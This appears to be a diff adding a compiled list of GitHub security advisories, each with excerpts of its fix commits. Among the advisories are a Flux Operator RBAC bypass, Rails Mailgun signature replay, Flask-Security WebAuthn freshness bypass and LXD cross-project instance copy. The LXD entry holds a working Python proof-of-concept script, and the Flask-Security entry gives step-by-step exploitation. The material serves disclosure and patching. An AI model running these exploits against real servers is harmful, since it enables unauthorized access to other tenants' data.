@@ -1,0 +1,744 @@
+=== GHSA-4xh5-jcj2-ch8q sev=medium pkgs=['go:github.com/controlplaneio-fluxcd/flux-operator']
+src=https://github.com/controlplaneio-fluxcd/flux-operator cwes=['CWE-269', 'CWE-862']
+SUMMARY: Flux Operator Web UI Impersonation Bypass via Empty OIDC Claims
+DESC: A privilege escalation vulnerability exists in the Flux Operator Web UI authentication code that allows an attacker to bypass Kubernetes RBAC impersonation and execute API requests with the operator's service account privileges. After OIDC token claims are processed through CEL expressions, there is no validation that the resulting `username` and `groups` values are non-empty. When both values are empty, the Kubernetes client-go library does not add impersonation headers to API requests, causing them to be executed with the flux-operator service account's credentials instead of the authenticated user's limited permissions. ### Impact - **Privilege Escalation**: Any authenticated user can escalate to operator-level read permissions and perform suspend/resume/reconcile actions - **Data Exposure**: Unauthorized read access to Flux resources across all namespaces, bypassing RBAC restrictions - **Information Disclosure**: View sensitive GitOps pipeline configurations, source URLs, and deployment status across the entire cluster ### Attack Scenario **Prerequisite**: Cluster admins must configure the Flux Operator with an OIDC provider that issues tokens lacking the expected claims (e.g., `email`, `groups`), or configure custom CEL expressions that can evaluate to empty values. 1. Cluster admin configures OIDC authentication with a provider that does not include `email` or `groups` claims in tokens 2. User authenticates with a valid token from that provider 3. The default CEL expressions evaluate to empty values: - Username: `has(claims.email) ? claims.email : ''` → `""` - Groups: `has(claims.groups) ? claims.groups : []` → `[]` 4. Authentication succeeds (token signature is valid) 5. A userClient is created with empty impersonation config 6. All subsequent API requests bypass impersonation and execute as the flux-operator service account 7. User gains operator-level read access across all namespaces ### Patches This vulnerability was fixed in Flux Operator v0.40.0. ### Workarounds The workaround is to make the `email` and `groups` claims required in the web config `impersonation` section. Example config: ```yaml apiVersion: web.fluxcd.controlplane.io/v1 kind: Config spec: baseURL: https://flux.example.com authentication: type: OAuth2 oauth2: provider: OIDC clientID: "<redacted>" clientSecret: "<redacted>" issuerURL: "https://login.microsoftonline.com/<redacted>/v2.0" scopes: [openid, profile, email, offline_access] impersonation: username: claims.email groups: claims.groups ``` ### References See the Pull Request fixing this vulnerability https://github.com/controlplaneio-fluxcd/flux-operator/pull/610 ### Credits This vulnerability was discovered by the Flux Operator maintainers during a debugging session with end-users.
+FIX pull https://github.com/controlplaneio-fluxcd/flux-operator/pull/610 status=200
+  PR: web: strict validation for RBAC impersonation | Sanitize and validate the user and groups used for Kubernetes RBAC impersonation after evaluating the CEL expressions for extracting the info from OIDC claims. Also make this validation consistent with Anonymous authentication.
+  MSG: Merge pull request #610 from controlplaneio-fluxcd/auth-validation web: strict validation for RBAC impersonation
+  FILE internal/web/auth/claims.go
+    +		// Sanitize and validate the extracted impersonation.
+    +		if err := imp.SanitizeAndValidate(); err != nil {
+    +			return nil, fmt.Errorf("impersonation validation failed: %w", err)
+    +		}
+  FILE internal/web/auth/claims_test.go
+    +		{
+    +			name: "impersonation validation fails when username and groups are empty",
+    +			conf: func() *config.ConfigSpec {
+    +				c := validOAuth2ConfigSpec()
+    +				c.Authentication.OAuth2.Impersonation = &config.ImpersonationSpec{
+    +					Username: "''",
+    +					Groups:   "[]",
+    +				}
+    +				return c
+    +			}(),
+    +			claims: map[string]any{
+    +				"email": "user@example.com",
+    +				"name":  "Test User",
+    +			},
+    +			wantErr: "impersonation validation failed: at least one of 'username' or 'groups' must be set",
+    +		},
+    +		{
+    +			name: "impersonation validation fails when group is empty string",
+    +			conf: func() *config.ConfigSpec {
+    +				c := validOAuth2ConfigSpec()
+    +				c.Authentication.OAuth2.Impersonation = &config.ImpersonationSpec{
+    +					Username: "claims.email",
+    +					Groups:   "['group1', '']",
+    +				}
+    +				return c
+    +			}(),
+  FILE internal/web/config/authentication_types.go
+  FILE internal/web/config/authentication_types_test.go
+  FILE internal/web/user/user.go
+  FILE internal/web/user/user_test.go
+FIX commit https://github.com/controlplaneio-fluxcd/flux-operator/commit/084540424f6de8ba5d88fb1fd1e8472ba29afd7e status=200
+  (same commit message as a fix above; diff not repeated)
+
+=== GHSA-75vq-qvhr-7ffr sev=medium pkgs=['nuget:Umbraco.Cms.Api.Delivery']
+src=https://github.com/umbraco/Umbraco-CMS cwes=['CWE-200']
+SUMMARY: Umbraco Delivery API allows for cached requests to be returned with an invalid API key
+DESC: ### Impact Umbraco's [content delivery API](https://docs.umbraco.com/umbraco-cms/reference/content-delivery-api) can be restricted from public access such that an API key must be provided in a header to authorize the request. It's also possible to configure output caching, such that the delivery API outputs will be cached for a period of time, improving performance. There's an issue when these two things are used together though in that the caching doesn't vary by the header that contains the API key. As such it's possible for a user without a valid API key to retrieve a response for a given path and query if it has recently been requested and cached by request with a valid key. ### Patches Patches will be available in 13.9.3, 15.4.4 and 16.1.1. ### Workarounds Workaround is to remove or reduce the time period of the output caching or to provide other restrictions to access the delivery API such as by IP. ### References Content delivery API documentation: https://docs.umbraco.com/umbraco-cms/reference/content-delivery-api
+FIX commit https://github.com/umbraco/Umbraco-CMS/commit/7e82c258eebaa595eadc9b000461e27d02bc030e status=200
+  MSG: Merge commit from fork Co-authored-by: kjac <kja@umbraco.dk>
+  FILE src/Umbraco.Cms.Api.Delivery/Caching/DeliveryApiOutputCachePolicy.cs
+    -        context.EnableOutputCaching = requestPreviewService.IsPreview() is false;
+    +        IApiAccessService apiAccessService = context
+    +            .HttpContext
+    +            .RequestServices
+    +            .GetRequiredService<IApiAccessService>();
+    +        context.EnableOutputCaching = requestPreviewService.IsPreview() is false && apiAccessService.HasPublicAccess();
+FIX commit https://github.com/umbraco/Umbraco-CMS/commit/9f37db18d11c8ba4e3ecdeb35291af30ebee7cd0 status=200
+  (same commit message as a fix above; diff not repeated)
+FIX commit https://github.com/umbraco/Umbraco-CMS/commit/da43086017e1e318f6b5373391d78421efebce3a status=200
+  (same commit message as a fix above; diff not repeated)
+
+=== GHSA-5957-c7qm-m469 sev=low pkgs=['rubygems:actionmailbox']
+src=https://github.com/rails/rails cwes=['CWE-294']
+SUMMARY: Action Mailbox: Possible signature replay in Action Mailbox Mailgun ingress
+DESC: ### Impact The Action Mailbox Mailgun ingress authenticates a request with an HMAC of the `timestamp` and `token` parameters concatenated without a separator, and `ActionMailbox::Ingresses::Mailgun::InboundEmailsController::Authenticator#recent?` rejects only timestamps more than 2 minutes in the past. Because the signature does not fix the boundary between the two values, a captured signed request can be presented with a timestamp far in the future, which the ingress then accepts indefinitely. An attacker who obtains one signed Mailgun webhook request, but not the signing key, could submit arbitrary inbound email that Action Mailbox processes as genuine, possibly leading to forged messages attributed to the sender of the attacker's choosing. Applications that receive inbound email through the Action Mailbox Mailgun ingress are affected. ### Details The fixed releases also reject a Mailgun request whose timestamp is more than 2 minutes ahead of the server's clock, as they already did for one more than 2 minutes behind it. An application whose clock runs more than 2 minutes behind Mailgun's will now reject genuine webhooks and should synchronize its clock. ### Releases The fixed releases are available at the normal locations. Patches for those who cannot upgrade at once: - 8.1: https://github.com/rails/rails/commit/c3a295c5c22266e8ec4d0e664e6923a299235e7a.patch - 8.0: https://github.com/rails/rails/commit/4aa2ec66822bc4eb8b341a0608f1c90a3e371a34.patch ### Credit This issue was responsibly reported by HackerOne researcher [davutselcuk](https://hackerone.com/davutselcuk).
+FIX commit https://github.com/rails/rails/commit/4aa2ec66822bc4eb8b341a0608f1c90a3e371a34 status=200
+  MSG: Reject Mailgun timestamps from the future The Mailgun ingress rejected a timestamp more than 2 minutes old but accepted any timestamp ahead of local time. Allow 2 minutes of drift in both directions. 
+  FILE actionmailbox/CHANGELOG.md
+    +*   Reject Mailgun inbound emails whose timestamp is more than 2 minutes ahead
+    +    of local time.
+    +    [GHSA-5957-c7qm-m469]
+    +    *Mike Dalessio*
+  FILE actionmailbox/app/controllers/action_mailbox/ingresses/mailgun/inbound_emails_controller.rb
+    -            Time.at(timestamp) >= 2.minutes.ago
+    +            Time.at(timestamp).between?(2.minutes.ago, 2.minutes.from_now)
+  FILE actionmailbox/test/controllers/ingresses/mailgun/inbound_emails_controller_test.rb
+    +  test "receiving an inbound email from Mailgun with a timestamp slightly ahead of local time" do
+    +    assert_difference -> { ActionMailbox::InboundEmail.count }, +1 do
+    +      travel_to "2018-10-09 15:14:00 EDT"
+    +      post rails_mailgun_inbound_emails_url, params: {
+    +        timestamp: 1539112500,
+    +        token: "7VwW7k6Ak7zcTwoSoNm7aTtbk1g67MKAnsYLfUB7PdszbgR5Xi",
+    +        signature: "ef24c5225322217bb065b80bb54eb4f9206d764e3e16abab07f0a64d1cf477cc",
+    +        "body-mime" => file_fixture("../files/welcome.eml").read
+    +      }
+    +    end
+    +    assert_response :no_content
+    +  end
+    +  test "rejecting an inbound email from Mailgun with a timestamp from the future" do
+    +    original_timestamp = "1539112500"
+    +    original_token = "7VwW7k6Ak7zcTwoSoNm7aTtbk1g67MKAnsYLfUB7PdszbgR5Xi"
+    +    future_timestamp = original_timestamp + original_token[0]
+    +    shortened_token = original_token[1..]
+    +    # The signature covers the timestamp and token joined into one string, so it holds for any split of that string.
+    +    assert_equal original_timestamp + original_token, future_timestamp + shortened_token
+    +    assert_no_difference -> { ActionMailbox::InboundEmail.count } do
+    +      travel_to "2018-10-09 15:26:00 EDT"
+    +      post rails_mailgun_inbound_emails_url, params: {
+    +        timestamp: future_timestamp,
+    +        token: shortened_token,
+FIX commit https://github.com/rails/rails/commit/c3a295c5c22266e8ec4d0e664e6923a299235e7a status=200
+  (same commit message as a fix above; diff not repeated)
+
+=== GHSA-f66q-9rf6-8795 sev=medium pkgs=['pip:Flask-Security-Too']
+src=https://github.com/pallets-eco/flask-security cwes=['CWE-287', 'CWE-863']
+SUMMARY: Flask-Security-Too: WebAuthn reauthentication freshness bypass via cross-user assertion
+DESC: ### Summary Flask-Security-Too 5.8.0 and 5.8.1 mark a session as reauthentication-fresh after processing a WebAuthn assertion whose proven credential belongs to a different user than the currently authenticated session user. The check that `GHSA-97r5-pg8x-p63p` added on the OAuth reauthentication path (`user.email == current_user.email`) is missing on the WebAuthn reauthentication path. An attacker who owns any WebAuthn credential registered to any account on the deployment can satisfy a victim session's freshness gate by submitting their own WebAuthn proof into the victim session. ### Affected versions `Flask-Security-Too` `>= 5.8.0, <= 5.8.1` (current `main` commit `5c44c76e33a20b67d02115e26d2da4bab18c094e`). `GHSA-97r5-pg8x-p63p` (published 2026-05-22) shipped its fix in 5.8.1 only on `oauth_glue.py`; `webauthn.py` was not touched and remains exploitable in 5.8.1. ### Privilege required Authenticated attacker on the same Flask-Security deployment, owning at least one WebAuthn credential of any usage (`first` / `secondary` / verify) that is registered to their own account. The attacker also needs the ability to drive HTTP requests against the WebAuthn endpoints inside the victim session (e.g. a separate gadget such as CSRF + cookie-based auth, an XSS that doesn't reach the cookie itself but can move the session through endpoints, or an existing session-fixation gadget; or the rarer but easier case of an attacker who has direct access to the victim's not-yet-fresh session via a shared browser). The point of the freshness gate is to defend exactly that "I have the session but it isn't fresh enough to do sensitive things" position, so any context in which freshness would have protected the victim is also the context in which this bypass matters. ### Vulnerable code [`flask_security/webauthn.py:846-889`](https://github.com/pallets-eco/flask-security/blob/5c44c76e33a20b67d02115e26d2da4bab18c094e/flask_security/webauthn.py#L846-L889) (commit `5c44c76e33a20b67d02115e26d2da4bab18c094e`): ```python @auth_required(lambda: cv("API_ENABLED_METHODS")) def webauthn_verify_response(token: str) -> ResponseValue: form = t.cast( WebAuthnSigninResponseForm, build_form_from_request("wan_signin_response_form") ) expired, invalid, state = check_and_get_token_status( token, "wan", get_within_delta("WAN_SIGNIN_WITHIN") ) ... form.challenge = state["challenge"] form.user_verification = state["user_verification"] form.is_secondary = False form.is_verify = True if form.validate_on_submit(): # update last use and sign count after_this_request(view_commit) assert form.cred assert form.user form.cred.lastuse_datetime = _security.datetime_factory() form.cred.sign_count = form.authentication_verification.new_sign_count _datastore.put(form.cred) # verified - so set freshness time. session["fs_paa"] = time.time() ... ``` [`flask_security/webauthn.py:276-308`](https://github.com/pallets-eco/flask-security/blob/5c44c76e33a20b67d02115e26d2da4bab18c094e/flask_security/webauthn.py#L276-L308) (the form's `validate()`): ```python def validate(self, **kwargs: t.Any) -> bool: if not super().validate(**kwargs): return False # pragma: no cover ... try: auth_cred = parse_authentication_credential_json(self.credential.data) except (...): ... return False # Look up credential Id (raw_id) and user. 7.2.6/7 self.cred = _datastore.find_webauthn(credential_id=auth_cred.raw_id) ... # This shouldn't be able to happen if datastore properly cascades delete self.user = _datastore.find_user_from_webauthn(self.cred) ``` `self.user` is resolved from the attacker-controlled `credential_id` and is never compared to `current_user`. The state token issued by `_signin_common` ([`webauthn.py:589-622`](https://github.com/pallets-eco/flask-security/blob/5c44c76e33a20b67d02115e26d2da4bab18c094e/webauthn.py#L589-L622)) carries only `{challenge, user_verification}`, so state tokens are not bound to any user and replay portably across sessions: ```python def _signin_common(user: UserMixin | None, usage: list[str]) -> tuple[t.Any, str]: ... state = { "challenge": challenge, "user_verification": uv, } ... state_token = t.cast(str, _security.wan_serializer.dumps(state)) return o_json, state_token ``` Contrast with the patch in [`oauth_glue.py:211`](https://github.com/pallets-eco/flask-security/blob/5c44c76e33a20b67d02115e26d2da4bab18c094e/oauth_glue.py#L211) that `GHSA-97r5-pg8x-p63p` shipped: ```python next_loc = session.pop("fs_oauth_next", None) if user and user.email == current_user.email: # verified - so set freshness time. session["fs_paa"] = time.time() ``` That `user.email == current_user.email` clamp is the missing check on the WebAuthn side. ### How input reaches the sink 1. Attacker logs in to their own account and registers their own WebAuthn credential (call it `cred_attacker`). They retain a copy of any valid `navigator.credentials.get()` assertion JSON produced by their authenticator (one signature is enough; can also be produced fresh on demand per request). 2. Attacker holds, or gets, a victim session in a state where `fs_paa` is past `FRESHNESS`. The victim is authenticated as themselves; the gate stops them from invoking freshness-protected business endpoints (`/change`, `/change-username`, `/wf-add`, `/us-setup`, anything decorated with `@auth_required(within=...)`). 3. The victim session calls `POST /wan-verify` and receives a `wan_state` token. The state token has no user binding. 4. Attacker submits an assertion that proves possession of `cred_attacker`, inside the victim session, to `POST /wan-verify/<wan_state>`. 5. `WebAuthnSigninResponseForm.validate` resolves `form.user` to the attacker account from `find_user_from_webauthn(self.cred)`, signs/verifies the assertion against the (attacker-controlled) public key it stored at registration time, and returns `True`. The user-handle check on `auth_cred.response.user_handle` (if present) compares against `self.user.fs_webauthn_user_handle`, i.e. it compares attacker user-handle to attacker [...]
+
+=== GHSA-qx75-2p3r-pwm5 sev=high pkgs=['go:github.com/canonical/lxd']
+src=https://github.com/canonical/lxd cwes=['CWE-284']
+SUMMARY: LXD has project restriction bypass in instance copy across projects 
+DESC: Reported from https://github.com/lxc/incus/security/advisories/GHSA-c9f5-j9c3-mhrg ### Summary Missing authorization checks exist for instance copying where an attacker knowing the name of a project that they don't have access to and the name of an instance in that project can copy the instance to a new project. This issue could allow an attacker to access secrets in instances they are not authorized to access. ### Details `cmd/incusd/instances.go` authorizes `POST /1.0/instances` against the target project. In the copy path, `cmd/incusd/instances_post.go` then loads the source instance from `req.Source.Project` without checking whether the caller can view that source instance. From my understanding, the copy must occur on the same server. However, once the copy has been done, nothing prevents a malicious actor from moving the instance to another server. ### PoC #### Setup We assume the target server is remotely accessible and a user/certificate has been added. ``` # create a new project and instance incus project create secrets incus profile show default | incus --project secrets edit default incus --project secrets init images:debian/trixie secret # restrict an existing certificate to prevent access to the project incus config trust edit cert-fp #> set, for example restricted: true projects: - default # verification, with the restricted certificate incus ls remote: ``` #### Exploitation The below script was partly generated. To copy the `secret` instance to the `default` project, the following command can be used. ``` python3 poc.py --url https://IP-REMOTE:8443 \ --cert path/to/client.crt --key path/to/client.key \ --target-project default --source-project secrets \ --source-instance secret --name copy-secret --insecure ``` Wait a bit for the instance to be copied, then `incus ls remote:` to see the copied instance. ``` #!/usr/bin/env python3 """Copy an instance from a project the caller should not be able to read.""" from __future__ import annotations import argparse import json import ssl import sys import urllib.error import urllib.parse import urllib.request def post(url: str, path: str, body: dict, cert: str, key: str, insecure: bool) -> bytes: ctx = ssl.create_default_context() if insecure: ctx.check_hostname = False ctx.verify_mode = ssl.CERT_NONE ctx.load_cert_chain(cert, key) req = urllib.request.Request( url.rstrip("/") + path, data=json.dumps(body).encode(), method="POST", headers={"Content-Type": "application/json", "Accept": "application/json"}, ) try: with urllib.request.urlopen(req, context=ctx) as resp: return resp.read() except urllib.error.HTTPError as exc: sys.stderr.write(exc.read().decode(errors="replace") + "\n") raise def main() -> int: ap = argparse.ArgumentParser() ap.add_argument("--url", required=True) ap.add_argument("--cert", required=True) ap.add_argument("--key", required=True) ap.add_argument("--target-project", required=True) ap.add_argument("--source-project", required=True) ap.add_argument("--source-instance", required=True) ap.add_argument("--name", required=True, help="new instance name in target project") ap.add_argument("--instance-only", action="store_true") ap.add_argument("--start", action="store_true") ap.add_argument("--insecure", action="store_true") ap.add_argument("--dry-run", action="store_true") args = ap.parse_args() body = { "name": args.name, "source": { "type": "copy", "source": args.source_instance, "project": args.source_project, "instance_only": args.instance_only, }, "start": args.start, } path = "/1.0/instances?" + urllib.parse.urlencode({"project": args.target_project}) print(json.dumps(body, indent=2)) if args.dry_run: return 0 print(post(args.url, path, body, args.cert, args.key, args.insecure).decode(errors="replace")) return 0 if __name__ == "__main__": raise SystemExit(main()) ``` ### Impact An attacker can copy instances they don't normally have access to, possibly leading to information disclosure.
+FIX commit https://github.com/canonical/lxd/commit/97cb037794cb6b21c5a184eb5f3292207adbf6b2 status=200
+  MSG: lxd: check for can_view on source when copying instance Signed-off-by: Kadin Sayani <kadin.sayani@canonical.com>
+  FILE lxd/instances_post.go
+    +	"github.com/canonical/lxd/lxd/auth"
+    +	if req.Source.Type == api.SourceTypeCopy {
+    +		if req.Source.Source == "" {
+    +			return response.BadRequest(errors.New("Must specify a source instance"))
+    +		}
+    +		if req.Source.Project == "" {
+    +			req.Source.Project = targetProjectName
+    +		}
+    +		var sourceURL *api.URL
+    +		instanceName, snapshotName, isSnapshot := api.GetParentAndSnapshotName(req.Source.Source)
+    +		if isSnapshot {
+    +			sourceURL = entity.InstanceSnapshotURL(req.Source.Project, instanceName, snapshotName)
+    +		} else {
+    +			sourceURL = entity.InstanceURL(req.Source.Project, req.Source.Source)
+    +		}
+    +		err = s.Authorizer.CheckPermission(r.Context(), sourceURL, auth.EntitlementCanView)
+    +		if err != nil {
+    +			return response.SmartError(err)
+    +		}
+    +	}
+FIX commit https://github.com/canonical/lxd/commit/bc1e20ea32dff6ae2df08803eee82832959ec80e status=200
+  MSG: lxd: check for view permission on source project when copying instance This effectively fixes the https://github.com/canonical/lxd/security/advisories/GHSA-qx75-2p3r-pwm5 Inspired-by: https://github.c
+  FILE lxd/instances_post.go
+    +	if req.Source.Type == "copy" {
+    +		if req.Source.Source == "" {
+    +			return response.BadRequest(fmt.Errorf("Must specify a source instance"))
+    +		}
+    +		if req.Source.Project == "" {
+    +			req.Source.Project = targetProjectName
+    +		}
+    +		if !s.Authorizer.UserHasPermission(r, req.Source.Project, "view") {
+    +			return response.Forbidden(nil)
+    +		}
+    +	}
+FIX commit https://github.com/canonical/lxd/commit/f7849615eb89e71a12ea76daaab6110bdf0fdf7f status=200
+  MSG: lxd: check for can_view on source when copying instance This effectively fixes the https://github.com/canonical/lxd/security/advisories/GHSA-qx75-2p3r-pwm5. Signed-off-by: Kadin Sayani <kadin.sayani@c
+  FILE lxd/instances_post.go
+    +	"github.com/canonical/lxd/lxd/auth"
+    +	"github.com/canonical/lxd/shared/entity"
+    +	if req.Source.Type == api.SourceTypeCopy {
+    +		if req.Source.Source == "" {
+    +			return response.BadRequest(errors.New("Must specify a source instance"))
+    +		}
+    +		if req.Source.Project == "" {
+    +			req.Source.Project = targetProjectName
+    +		}
+    +		var sourceURL *api.URL
+    +		instanceName, snapshotName, isSnapshot := api.GetParentAndSnapshotName(req.Source.Source)
+    +		if isSnapshot {
+    +			sourceURL = entity.InstanceSnapshotURL(req.Source.Project, instanceName, snapshotName)
+    +		} else {
+    +			sourceURL = entity.InstanceURL(req.Source.Project, req.Source.Source)
+    +		}
+    +		err = s.Authorizer.CheckPermission(r.Context(), sourceURL, auth.EntitlementCanView)
+    +		if err != nil {
+    +			return response.SmartError(err)
+    +		}
+    +	}
+
+=== GHSA-vc7v-qv4w-wrv8 sev=medium pkgs=['npm:next']
+src=https://github.com/vercel/next.js cwes=['CWE-362']
+SUMMARY: Next.js: Cache leak across root param values in nested 'use cache' functions via delayed inner stream metadata
+DESC: With Cache Components enabled, an outer `'use cache'` function can be keyed incorrectly even when its inner `'use cache'` call generates a fresh entry. If the inner function reads a root param (via `next/root-params`) and returns a value that still contains pending promises — for example an object with data that is ready immediately alongside slower data — React Flight delivers the ready portion to the outer function before the inner entry has finished publishing its root param dependencies. The outer function can then finish, and its cache entry is persisted under a key that omits that root param. The entry is written once and reused for all root param values, so a response for one root param value can serve content produced for a different value. Entries written this way can also ignore tag invalidation and cache lifetimes of the nested caches they consumed. What values are leaked cannot be attacker controlled. Which value's content is served depends only on which invocation wrote the entry first. This is a variant of https://github.com/advisories/GHSA-h694-7cp9-m8p3 that the fix for that advisory does not cover: it does not require the inner call to be served from an existing entry, and it does not depend on a slow cache handler.
+FIX commit https://github.com/vercel/next.js/commit/80c96ede21798d4ad54da12fe50d5b00a09b06e3 status=200
+  MSG: [lts-active] Fix outer `'use cache'` entries reused across root param values (#276) Co-authored-by: Claude Code (kimi-k3[1m]) <noreply@anthropic.com>
+  FILE packages/next/src/server/app-render/work-unit-async-storage.external.ts
+    +  /**
+    +   * Entry collection waits for these promises before it reads metadata from
+    +   * this store.
+    +   */
+    +  readonly pendingNestedCacheMetadata: Set<Promise<unknown>>
+  FILE packages/next/src/server/use-cache/use-cache-wrapper.ts
+    +/**
+    + * Registers pending nested metadata with the outer cache store. The supplied
+    + * promise must fulfill only after metadata propagation completes. Callers must
+    + * register the promise before returning the nested value.
+    + */
+    +function trackNestedCacheMetadata(
+    +  cacheContext: CacheContext,
+    +  pendingMetadata: Promise<unknown>
+    +): void {
+    +  const { outerWorkUnitStore } = cacheContext
+    +  if (
+    +    cacheContext.skipPropagation ||
+    +    (outerWorkUnitStore.type !== 'cache' &&
+    +      outerWorkUnitStore.type !== 'private-cache')
+    +  ) {
+    +    return
+    +  }
+    +  const pendingSet = outerWorkUnitStore.pendingNestedCacheMetadata
+    +  const tracked = pendingMetadata.finally(() => {
+    +    pendingSet.delete(tracked)
+    +  })
+    +  // This handler prevents an unhandled rejection if the promise rejects before
+    +  // `collectResult` waits for it.
+    +  tracked.catch(ignoreReject)
+    +  pendingSet.add(tracked)
+  FILE test/e2e/app-dir/app-root-params-getters/fixtures/use-cache-dedup/app/[countryCode]/[lang]/flight-tail-joined/page.tsx
+  FILE test/e2e/app-dir/app-root-params-getters/fixtures/use-cache-dedup/app/[countryCode]/[lang]/flight-tail/page.tsx
+  FILE test/e2e/app-dir/app-root-params-getters/use-cache.test.ts
+
+=== GHSA-6x8v-2fq5-2229 sev=low pkgs=['go:github.com/zitadel/zitadel']
+src=https://github.com/zitadel/zitadel cwes=['CWE-284', 'CWE-639']
+SUMMARY:  ZITADEL: Cross-Tenant User Leakage via Recycled Identifiers
+DESC: ### Summary A flaw in the user lifecycle enforcement allowed deleted users to retain their original organization/tenant association. Recreating a deleted user under a distinct organization can cause the new user instance to be incorrectly provisioned within the original organization if the previous ID would be used to recreate it. ### Impact When a user is created, the system maps the generated or provided ID to its target organization (`Org A`). When that user is subsequently deleted, a deletion event is appended to the stream, but the historical mapping of the resource owner within the event store's validation layer is not cleared. If a new user is later provisioned in a different organization (`Org B`) using that exact same ID, the event store validation logic reads the stream's history, matches it to the original organization, and routes the new user's events to `Org A` instead of `Org B`. This issue represents a localized multi-tenancy isolation anomaly rather than an easily exploitable attack vector. Because the new user instance is incorrectly routed and provisioned inside `Org A` instead of `Org B`, an administrator from `Org A` inadvertently gains full access to this new user record. However, there is no technical mechanism for a malicious actor to force, automate, or target this behavior against a specific user or tenant. Because the scenario relies entirely on an accidental sequence of operational events and requires the recycling of a highly specific ID space, the practical security risk is exceptionally low. ### Affected Versions Systems running one of the following versions are affected: * **4.x:** `4.0.0` through `4.15.1` (including RC versions) * **3.x:** `3.0.0` through `3.4.11` (including RC versions) ### Patches The vulnerability has been addressed in the latest releases. The patch resolves the issue by requiring the correct permission in case the verification flag is provided and only allows self-management of the email address, resp. phone number itself. - **4.x**: Upgrade to $\ge$[4.15.2](https://github.com/zitadel/zitadel/releases/tag/v4.15.2) - **3.x**: Update to $\ge$[4.15.2](https://github.com/zitadel/zitadel/releases/tag/v4.15.2) ### Workarounds The recommended solution is to upgrade to a patched version. ### Questions If you have any questions or comments about this advisory, please email us at [security@zitadel.com](mailto:security@zitadel.com) ### Credits Thanks to Charlie Graven from Famedly for reporting this vulnerability.
+FIX commit https://github.com/zitadel/zitadel/commit/6082e59d47c17a9d54a6b0556b3f31559d7c620a status=200
+  MSG: fix(eventstore): allow overwriting resource owner of events (#12261) # Which Problems Are Solved - The eventstore did not support intentionally overwriting the resource owner when creating events for 
+  FILE cmd/initialise/sql/08_events_table.sql
+    -    CREATE TYPE eventstore.command AS (
+    +    CREATE TYPE eventstore.command2 AS (
+    +        , enforce_owner BOOLEAN
+    -CREATE OR REPLACE FUNCTION eventstore.commands_to_events(commands eventstore.command[]) RETURNS SETOF eventstore.events2 VOLATILE AS $$
+    -SELECT
+    -    c.instance_id
+    -    , c.aggregate_type
+    -    , c.aggregate_id
+    -    , c.command_type AS event_type
+    -    , cs.sequence + ROW_NUMBER() OVER (PARTITION BY c.instance_id, c.aggregate_type, c.aggregate_id ORDER BY c.in_tx_order) AS sequence
+    -    , c.revision
+    -    , NOW() AS created_at
+    -    , c.payload
+    -    , c.creator
+    -    , cs.owner
+    -    , EXTRACT(EPOCH FROM NOW()) AS position
+    -    , c.in_tx_order
+    -FROM (
+    -    SELECT
+    +DO $$ BEGIN
+    +    CREATE TYPE eventstore.latest_command AS (
+    +        instance_id TEXT
+    +        , aggregate_type TEXT
+    +        , aggregate_id TEXT
+    +        , owner TEXT
+    +        , sequence BIGINT
+    +    );
+    +EXCEPTION
+    +    WHEN duplicate_object THEN null;
+    +END $$;
+  FILE cmd/setup/40/01_type.sql
+  FILE cmd/setup/40/02_func.sql
+  FILE cmd/setup/64.go
+  FILE cmd/setup/64.sql
+  FILE cmd/setup/70.go
+  FILE cmd/setup/70.sql
+  FILE cmd/setup/config.go
+  FILE cmd/setup/setup.go
+  FILE internal/command/group_model.go
+  FILE internal/command/metadata_model.go
+  FILE internal/command/org_action_model.go
+  FILE internal/command/org_domain_model.go
+  FILE internal/command/org_metadata_model.go
+  FILE internal/command/project_application_api_model.go
+  FILE internal/command/project_application_key_model.go
+  FILE internal/command/project_application_model.go
+  FILE internal/command/project_application_oidc_model.go
+  FILE internal/command/project_application_saml_model.go
+  FILE internal/command/project_application_secret_model.go
+
+=== GHSA-vjp8-wprm-2jw9 sev=low pkgs=['npm:openclaw']
+src=https://github.com/openclaw/openclaw cwes=['CWE-863']
+SUMMARY: OpenClaw has cross-account DM pairing authorization bypass via unscoped pairing store access
+DESC: ### Summary OpenClaw had account-scope gaps in pairing-store access for DM pairing policy, which could let a pairing approval from one account authorize the same sender on another account in multi-account setups. ### Impact This is an authorization-boundary weakness in multi-account channel deployments. A sender approved in one account could be accepted in another account before explicit approval there. ### Affected Packages / Versions - Package: `openclaw` (npm) - Latest published version affected: `2026.2.25` - Vulnerable range: `<= 2026.2.25` - Patched version (planned next release): `>= 2026.2.26` ### Fix OpenClaw now enforces account-scoped pairing reads/writes consistently across core and extension message channels, with stricter runtime/SDK helpers and shared policy wiring to prevent cross-account pairing bleed. ### Fix Commit(s) - `a0c5e28f3bf0cc0cd9311f9e9ec2ca0352550dcf` - `bce643a0bd145d3e9cb55400af33bd1b85baeb02` ### Release Process Note `patched_versions` is pre-set to the planned next release (`2026.2.26`). After npm publish of that version, this advisory is ready to publish without further content edits. OpenClaw thanks @tdjackey for reporting.
+FIX commit https://github.com/openclaw/openclaw/commit/a0c5e28f3bf0cc0cd9311f9e9ec2ca0352550dcf status=200
+  MSG: refactor(extensions): use scoped pairing helper
+  FILE extensions/bluebubbles/src/monitor-processing.ts
+    +  createScopedPairingAccess,
+    +  const pairing = createScopedPairingAccess({
+    +    core,
+    +    channel: "bluebubbles",
+    +    accountId: account.accountId,
+    +  });
+    +    accountId: account.accountId,
+    -    readStore: (provider) => core.channel.pairing.readAllowFromStore(provider),
+    +    readStore: pairing.readStoreForDmPolicy,
+    -      const { code, created } = await core.channel.pairing.upsertPairingRequest({
+    -        channel: "bluebubbles",
+    +      const { code, created } = await pairing.upsertPairingRequest({
+    +  const pairing = createScopedPairingAccess({
+    +    core,
+    +    channel: "bluebubbles",
+    +    accountId: account.accountId,
+    +  });
+    +    accountId: account.accountId,
+    -    readStore: (provider) => core.channel.pairing.readAllowFromStore(provider),
+    +    readStore: pairing.readStoreForDmPolicy,
+  FILE extensions/feishu/src/bot.ts
+    +  createScopedPairingAccess,
+    +    const pairing = createScopedPairingAccess({
+    +      core,
+    +      channel: "feishu",
+    +      accountId: account.accountId,
+    +    });
+    -        ? await core.channel.pairing.readAllowFromStore("feishu").catch(() => [])
+    +        ? await pairing.readAllowFromStore().catch(() => [])
+    -        const { code, created } = await core.channel.pairing.upsertPairingRequest({
+    -          channel: "feishu",
+  FILE extensions/googlechat/src/monitor.ts
+  FILE extensions/irc/src/inbound.ts
+  FILE extensions/matrix/src/matrix/monitor/handler.ts
+  FILE extensions/mattermost/src/mattermost/monitor.ts
+  FILE extensions/msteams/src/monitor-handler/message-handler.ts
+  FILE extensions/nextcloud-talk/src/inbound.ts
+  FILE extensions/zalo/src/monitor.ts
+  FILE extensions/zalouser/src/monitor.ts
